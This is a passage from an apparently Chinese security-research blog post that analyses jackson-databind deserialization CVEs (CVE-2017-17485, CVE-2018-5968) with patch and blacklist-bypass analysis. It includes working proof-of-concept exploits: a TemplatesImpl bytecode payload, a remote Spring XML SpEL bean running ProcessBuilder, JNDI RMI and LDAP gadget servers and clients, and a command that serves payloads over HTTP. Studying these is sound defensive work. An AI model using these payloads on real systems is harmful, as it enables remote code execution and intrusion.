AAAASAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAXAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=\&quot;],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;\&quot;transletName\&quot;:\&quot;blckder02\&quot;,&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;\&quot;outputProperties\&quot;:&#123;&#125;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        <span class="type">User</span> <span class="variable">obj</span> <span class="operator">=</span> objectMapper.readValue(jsonStr,User.class);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行成功：<br><img src="/./images/1662012781041.png" alt="enter description here"></p>
+<p>不开启 DefaultTyping 的话只会将 JSON 数据当作普通字符串来解析，并不会触发<code>object</code>属性值里的恶意代码；<br><img src="/./images/1662084782015.png" alt="enter description here"></p>
+<h3 id="POC-调试"><a href="#POC-调试" class="headerlink" title="POC 调试"></a>POC 调试</h3><p>跟进<code>ObjectMapper.readValue()</code> ；<br><img src="/./images/1662013395525.png" alt="enter description here"></p>
+<p>分别跟进，<code>JsonFactory.createParser()</code>，封装了要反序列化的 JSON 数据，返回一个<code>ReaderBasedJsonParser</code>类对象；<br><img src="/./images/1662013378333.png" alt="enter description here"></p>
+<p>跟进<code>TypeFactory.constructType()</code>，获取到的是<code>entity.User</code>类；<br><img src="/./images/1662013748634.png" alt="enter description here"></p>
+<p>然后跟进 <code>ObjectMapper._readMapAndClose()</code>，各变量的值如图所示；<br><img src="/./images/1662013089057.png" alt="enter description here"></p>
+<p>跟进<code>BeanDeserializer.deserialize()</code>，进入 if 语句；<br><img src="/./images/1662013996184.png" alt="enter description here"></p>
+<p>跟进<code>vanillaDeserialize()</code>，调用<code>StdValueInstantiator.createUsingDefault()</code>方法根据构造方法实例化了一个 User 对象，各属性值都为 null ；<br><img src="/./images/1662014307139.png" alt="enter description here"></p>
+<p><img src="/./images/1662014457546.png" alt="enter description here"></p>
+<p>跟进<code>MethodProperty.deserializeAndSet()</code>，调用了<code>SettableBeanProperty.deserialize()</code> -&gt; <code>StringDeserializer.deserialize()</code>方法，将<code>name</code>的值取了出来，然后调用 <code>setter</code>方法将值赋给前面生成的 User 对象；<br><img src="/./images/1662015151424.png" alt="enter description here"></p>
+<p>循环调用<code>deserializeAndSet()</code>方法，把每一个属性的值都取出来赋给 User 对象；<br>直到获取<code>object</code>的值，<code>this._valueTypeDeserializer</code>的值不为 null ，调用<code>UntypedObjectDeserializer.deserializeWithType()</code>;<br><img src="/./images/1662015560299.png" alt="enter description here"></p>
+<p>继续调用<code>AsArrayTypeDeserializer.deserializeTypedFromAny()</code> -&gt; <code>_deserialize()</code>，获取到对应<code>TemplatesImpl</code>类的 deser 是<code>BeanDeserializer</code>类型；<br><img src="/./images/1662016177875.png" alt="enter description here"></p>
+<p>调用<code>BeanDeserializer.deserialize()</code> -&gt; <code>vanillaDeserialize()</code> -&gt; <code>MethodProperty.deserializeAndSet()</code>，和前面一样，将 JSON 数据中 TemplatesImpl 的值去除赋给<code>TemplatesImpl</code> 对象；<br><img src="/./images/1662016369650.png" alt="enter description here"></p>
+<p>当取到<code>outputProperties</code>变量时，跟进到<code>SetterlessProperty.deserializeAndSet()</code>，调用的是<code>getter</code>方法；<br><img src="/./images/1662016805174.png" alt="enter description here"></p>
+<p>这里为什么调用<code>deserializeAndSet()</code>的类不一样，是因为<code>outputProperties</code>变量对应的类不一样；<br><img src="/./images/1662018097726.png" alt="enter description here"></p>
+<p><img src="/./images/1662018104480.png" alt="enter description here"></p>
+<p>继续，一直跟进到<code>TemplatesImpl.defineTransletClasses()</code>，和 Fastjson 一样，在这里将传入的字节码转换为了 Java 对象；<br><img src="/./images/1662017057153.png" alt="enter description here"></p>
+<p><img src="/./images/1662017113196.png" alt="enter description here"></p>
+<p>然后在<code>getTransletInstance()</code>实例化该对象，触发命令执行。<br><img src="/./images/1662017177249.png" alt="enter description here"></p>
+<p>调用链如下：<br><img src="/./images/1662018933106.png" alt="enter description here"></p>
+<p>可以看到在<code>defineTransletClasses()</code>的 332 行中，和之前分析的 Fastjson 有点不一样；<br>之前是这样的，区别在于有无<code>_tfactory</code>参数：<br><img src="/./images/1662017342741.png" alt="enter description here"></p>
+<p>这是因为 JDK 版本不同，如果使用 8u112 版本，把<code>_tfactory</code>参数添加到 POC 里<code>_tfactory:&#123; &#125;</code>，会报错；<br><img src="/./images/1662017666316.png" alt="enter description here"></p>
+<p>这个错误是 jackson-databind 报的，说明它不支持这个参数，所以只能选择没有<code>_tfactory</code>参数的 JDK 版本进行利用。</p>
+<p>参考链接：<br><a target="_blank" rel="noopener" href="http://www.liuhaihua.cn/archives/634571.html">http://www.liuhaihua.cn/archives/634571.html</a></p>
+<h2 id="CVE-2017-17485"><a href="#CVE-2017-17485" class="headerlink" title="CVE-2017-17485"></a>CVE-2017-17485</h2><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>jackson-databind 2.7.9.1 版本中，在获取<code>typeId</code>对应的 Deserializer 类型时，对传入的类做了黑名单校验；<br><img src="/./images/1662019745443.png" alt="enter description here"></p>
+<p>一直到<code>BeanDeserializerFactory.createBeanDeserializer()</code>中，调用了 <code>checkIllegalTypes()</code>方法（注意看调用链）；<br><img src="/./images/1662019828275.png" alt="enter description here"></p>
+<p>跟进<code>checkIllegalTypes()</code>，获取了传入类的全类名，然后在黑名单中对比；<br><img src="/./images/1662019874469.png" alt="enter description here"></p>
+<p>可以看到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>以及被加入到了黑名单中，所以无法在利用了。</p>
+<h3 id="补丁绕过"><a href="#补丁绕过" class="headerlink" title="补丁绕过"></a>补丁绕过</h3><p>在开启<code>enableDefaultTyping()</code>的情况下，利用<code>org.springframework.context.support.ClassPathXmlApplicationContext</code>来加载远程指定的 XML 配置文件，在配置文件中定义一个 bean ，bean 中通过使用 Spring EL 表达式来调用<code>java.lang.ProcessBuilder</code>的<code>start()</code>方法来执行命令。</p>
+<p>导入依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造 bean 文件 <code>spel.xml</code>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;calc.exe&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; pb.start() &#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>启一个 web 服务，把 bean 文件放到能访问的 web 目录下：<br><code>python -m http.server 8081</code></p>
+<p>构造 POC ，把<code>object</code> 属性赋值为<code>org.springframework.context.support.ClassPathXmlApplicationContext</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonPoc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonStr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;blckder02\&quot;,\&quot;age\&quot;:21,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;object\&quot;:[&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;http://127.0.0.1:8081/spel.xml\&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        <span class="type">User</span> <span class="variable">obj</span> <span class="operator">=</span> objectMapper.readValue(jsonStr,User.class);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行成功：<br><img src="/./images/1662024961477.png" alt="enter description here"></p>
+<p><strong>影响版本</strong></p>
+<ul>
+<li>Jackson-databind version 2.9.3</li>
+<li>Jackson-databind version 2.7.9.1</li>
+<li>Jackson-databind version 2.8.10</li>
+</ul>
+<h3 id="POC-调试-1"><a href="#POC-调试-1" class="headerlink" title="POC 调试"></a>POC 调试</h3><p>跟进获取<code>object</code>属性值时的<code>BeanDeserializer.vanillaDeserialize()</code>；<br><img src="/./images/1662080577620.png" alt="enter description here"></p>
+<p>能成功绕过黑名单，一直到<code>AnnotatedConstructor.call1()</code>，调用<code>ClassPathXmlApplicationContext</code>的构造函数，以<code>http://127.0.0.1:8081/spel.xml</code>为参数实例化了一个对象；<br><img src="/./images/1662081401692.png" alt="enter description here"></p>
+<p>这一步就是 Spring 加载配置文件、创建和初始化 bean 的步骤了。</p>
+<p>继续跟跟看，跟进构造方法；<br><img src="/./images/1662081791079.png" alt="enter description here"></p>
+<p>调用<code>setConfigLocations()</code>，对远程地址进行解析；<br><img src="/./images/1662081826031.png" alt="enter description here"></p>
+<p>而后 new 了一个 StandardEnvironment；<br><img src="/./images/1662082355384.png" alt="enter description here"></p>
+<p>它是 AbstractEnvironment 的子类，作用是获取和设置应用程序的属性和环境；<br><img src="/./images/1662083055201.png" alt="enter description here"></p>
+<p>最后 refresh 一下，触发命令执行。<br><img src="/./images/1662082592852.png" alt="enter description here"></p>
+<p>调用链如下：<br><img src="/./images/1662083299586.png" alt="enter description here"></p>
+<p>参考链接：<br><a target="_blank" rel="noopener" href="https://github.com/irsl/jackson-rce-via-spel/">https://github.com/irsl/jackson-rce-via-spel/</a></p>
+<h3 id="c3p0利用"><a href="#c3p0利用" class="headerlink" title="c3p0利用"></a>c3p0利用</h3><p>使用<code>com.mchange.v2.c3p0.JndiRefForwardingDataSource</code>，通过 JNDI+ RMI 进行利用。<br>服务端代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> AlreadyBoundException, RemoteException, NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8081/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;CalcCmd&quot;</span>, <span class="string">&quot;CalcCmd&quot;</span>, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;calc&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>客户端代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonStr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;blckder02\&quot;,\&quot;age\&quot;:21,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;object\&quot;:[&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;jndiName\&quot;:\&quot;rmi://127.0.0.1:1099/calc\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;loginTimeout\&quot;:0&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        <span class="type">User</span> <span class="variable">obj</span> <span class="operator">=</span> objectMapper.readValue(jsonStr,User.class);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行成功：<br><img src="/./images/1662100529926.png" alt="enter description here"></p>
+<p>这里调用<code>jndiName</code>的 set 方法，把<code>rmi://127.0.0.1:1099/calc</code>赋给它；<br><img src="/./images/1662100823486.png" alt="enter description here"></p>
+<p>然后调用到<code>loginTimeout</code>的 set 方法；<br><img src="/./images/1662101138970.png" alt="enter description here"></p>
+<p>跟进<code>setLoginTimeout()</code> -&gt; <code>inner()</code>；<br><img src="/./images/1662101239802.png" alt="enter description here"></p>
+<p>跟进<code>JndiRefForwardingDataSource.dereference()</code>，调用到<code>lookup()</code>，触发命令执行。<br><img src="/./images/1662101317883.png" alt="enter description here"></p>
+<p>调用链如下：<br><img src="/./images/1662101392968.png" alt="enter description here"></p>
+<h2 id="CVE-2018-5968"><a href="#CVE-2018-5968" class="headerlink" title="CVE-2018-5968"></a>CVE-2018-5968</h2><h3 id="补丁分析-1"><a href="#补丁分析-1" class="headerlink" title="补丁分析"></a>补丁分析</h3><p> 2.7.9.2 版本中，使用了<code>validateSubType()</code>方法对传入的类进行黑名单校验；<br> 虽然<code>org.springframework.context.support.ClassPathXmlApplicationContext</code>不在黑名单中，但是专门对<code>org.springframework.</code>开头的类进行了判断；<br><img src="/./images/1662085291606.png" alt="enter description here"></p>
+<p>然后循环获取它的父类，再在 if 中进行对比，若父类为<code>AbstractPointcutAdvisor</code>或<code>AbstractApplicationContext</code>，则跳出循环，抛出异常。<br><img src="/./images/1662085606717.png" alt="enter description here"></p>
+<p>同时也把 c3p0 可利用的类加入了黑名单；<br><img src="/./images/1662101506562.png" alt="enter description here"></p>
+<h3 id="补丁绕过-1"><a href="#补丁绕过-1" class="headerlink" title="补丁绕过"></a>补丁绕过</h3><p>寻找黑名单中没有的、可利用的类，可以使用<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>，通过 JNDI + LDAP 的方式进行利用。</p>
+<p>漏洞触发点在<code>JndiDataSourceFactory.setProperties()</code>中，if 分支和 else if 分支都使用了 lookup，满足其中一个分支就可以了；<br><img src="/./images/1662088302448.png" alt="enter description here"></p>
+<p>这里我根据 else if 分支来构造 POC，也就是说如果<code>properties</code>参数里面包含<code>data_source</code>，就进入else if；<br>那么就向<code>properties</code>参数中传入一个 键为<code>data_source</code>，值为远程恶意类地址 的值，当反序列化时调用到<code>setProperties()</code>，进入 else if 分支，检索指定的远程对象，导致RCE。</p>
+<p>导入依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>启一个 Web 服务，上传命令执行类的 class 文件；</p>
+<p>服务端代码编写（参考<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">marshalsec</a>）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span 